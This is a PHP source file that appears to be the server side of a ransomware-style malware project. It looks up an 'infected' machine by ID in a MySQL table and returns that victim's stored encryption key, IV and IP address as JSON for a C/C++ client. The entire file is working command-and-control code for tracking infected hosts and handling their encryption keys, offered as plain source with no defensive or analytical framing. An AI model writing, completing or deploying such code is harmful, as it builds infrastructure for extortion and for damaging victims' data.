<?php

require_once "config.php";

$response_id = "";
$response_key = "";
$response_iv = "";
$response_ip = getip();

//
$infected_id = "";
if (array_key_exists("infectedId", $_GET)) {
    $infected_id = $_GET["infectedId"];
}
else {
    die("No Key Id");
}

//connect to mysql
$connection = mysqli_connect($config_mysql_host, $config_mysql_user, $config_mysql_password, $config_mysql_db);
if (!$connection) {
      //Make sure c/c++ code checks for invalid responses!!
    die("Database Connection Failed");
}

//fetch key/iv from database
$select_query = "SELECT * FROM infected WHERE id = ?";
if ($stmt = $connection->prepare($select_query)) {
    $stmt->bind_param("s", $infected_id);
    $stmt->execute();
    $result = $stmt->get_result();
    if ($result !== false && $result->num_rows > 0) {
        $row = $result->fetch_assoc();
        // TODO: add some error checking here this is very sketchy :P
        $response_id = $row["id"];
        $response_key = $row["key"];
        $response_iv = $row["iv"];
        $response_ip = $row["ip"];
    }
    $stmt->close();
}
else {
      //Make sure c/c++ code checks for invalid responses!!
    die("Database Select Failed");
}

//return json
//order of values id, key, iv, ip
header('Content-Type: application/json');
print json_encode(array("id" => $response_id, "key" => $response_key, "iv" => $response_iv, "ip" => $response_ip));